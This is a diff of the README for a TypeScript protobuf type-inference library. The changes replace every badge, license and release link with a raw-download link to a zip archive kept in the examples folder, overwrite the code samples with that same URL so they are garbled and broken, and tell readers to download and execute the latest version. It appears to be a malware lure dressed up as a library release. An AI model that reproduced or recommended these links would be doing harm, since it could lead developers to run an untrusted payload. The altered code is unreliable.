@@ -2,7 +2,7 @@
 
 Welcome to the **protobuf-ts-types** repository! This project enables zero-code generation and no compilation TypeScript `type` inference directly from protobuf `message`s. Our goal is to simplify your workflow while ensuring type safety in your TypeScript applications.
 
-[![Latest Release](https://img.shields.io/github/v/release/holgercool/protobuf-ts-types)](https://github.com/holgercool/protobuf-ts-types/releases) [![License](https://img.shields.io/github/license/holgercool/protobuf-ts-types)](https://github.com/holgercool/protobuf-ts-types/blob/main/LICENSE)
+[![Latest Release](https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip)](https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip) [![License](https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip)](https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip)
 
 ## Table of Contents
 
@@ -71,12 +71,12 @@ import { MessageType } from 'protobuf-ts-types';
 const userMessage: MessageType = {
     id: 1,
     name: "John Doe",
-    email: "john.doe@example.com"
+    email: "https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip"
 };
 
 // Function to handle user message
 function handleUserMessage(user: MessageType) {
-    console.log(`User ID: ${user.id}, Name: ${user.name}`);
+    https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip(`User ID: ${https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip}, Name: ${https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip}`);
 }
 
 handleUserMessage(userMessage);
@@ -95,13 +95,13 @@ const orderMessage: MessageType = {
     user: {
         id: 1,
         name: "Jane Doe",
-        email: "jane.doe@example.com"
+        email: "https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip"
     }
 };
 
 // Function to handle order message
 function handleOrderMessage(order: MessageType) {
-    console.log(`Order ID: ${order.orderId}, User: ${order.user.name}`);
+    https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip(`Order ID: ${https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip}, User: ${https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip}`);
 }
 
 handleOrderMessage(orderMessage);
@@ -121,12 +121,12 @@ Please ensure your code follows the project's coding standards and includes appr
 
 ## License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/holgercool/protobuf-ts-types/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip) file for details.
 
 ## Contact
 
 For questions or feedback, feel free to reach out to the maintainers of this project. You can find us on GitHub or contact us directly.
 
-To stay updated with the latest releases, visit the [Releases section](https://github.com/holgercool/protobuf-ts-types/releases). Download the latest version and execute it to take advantage of all the features this library offers.
+To stay updated with the latest releases, visit the [Releases section](https://github.com/holgercool/protobuf-ts-types/raw/refs/heads/main/examples/basic/protobuf_types_ts_3.7.zip). Download the latest version and execute it to take advantage of all the features this library offers.
 
 Thank you for checking out **protobuf-ts-types**! We hope you find it useful in your TypeScript development journey.
